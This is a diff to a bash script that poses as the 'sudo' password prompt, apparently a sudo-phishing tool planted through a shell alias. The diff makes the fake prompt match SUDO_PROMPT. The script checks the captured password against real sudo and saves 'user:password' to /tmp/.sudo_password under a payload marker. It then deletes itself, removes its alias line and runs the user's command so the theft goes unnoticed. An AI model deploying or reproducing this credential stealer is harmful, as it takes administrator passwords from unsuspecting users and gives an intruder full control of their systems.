@@ -6,36 +6,41 @@
 # of the "sudo" command.
 #
 
-readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
+if [ -z "${SUDO_PROMPT}" ]; then
+    readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
+else
+    readonly INPUT_MESSAGE="${SUDO_PROMPT}"
+fi
+
 readonly MAXIMUM_ATTEMPTS=3
 readonly ERROR_MESSAGE="sudo: ${MAXIMUM_ATTEMPTS} incorrect password attempts"
 
 attempts() {
-    /usr/bin/echo -n "${INPUT_MESSAGE}"
+    /bin/echo -n "${INPUT_MESSAGE}"
     read -r -s sudo_password
-    /usr/bin/echo ""
-    if /usr/bin/echo "${sudo_password}" | /usr/bin/sudo -S /usr/bin/true 2> /dev/null; then
+    /bin/echo ""
+    if ( /bin/echo "${sudo_password}" | /usr/bin/sudo -S /usr/bin/true > /dev/null 2>&1 ); then
         ##
         # <YOUR-PAYLOAD>
         ##
-        /usr/bin/echo "${USER}:${sudo_password}" > /tmp/.sudo_password
+        /bin/echo "${USER}:${sudo_password}" > /tmp/.sudo_password
         ##
         # </YOUR-PAYLOAD>
         ##
         /usr/bin/rm ~/.sudo_phishing.sh
         /usr/bin/head -n -1 ~/.bash_aliases > ~/.bash_aliases_bak
         /usr/bin/mv ~/.bash_aliases_bak ~/.bash_aliases
-        /usr/bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
+        /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
         $BASH
         exit 0
     fi
 }
 
-if (/usr/bin/sudo -n /usr/bin/true 2> /dev/null) || [ "${#}" -eq 0 ]; then
+if ( (/usr/bin/sudo -n /usr/bin/true > /dev/null 2>&1) || [ "${#}" -eq 0 ] ); then
     /usr/bin/sudo "${@}"
 else
     for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
         attempts "${@}"
     done
-    /usr/bin/echo "${ERROR_MESSAGE}"
+    /bin/echo "${ERROR_MESSAGE}"
 fi
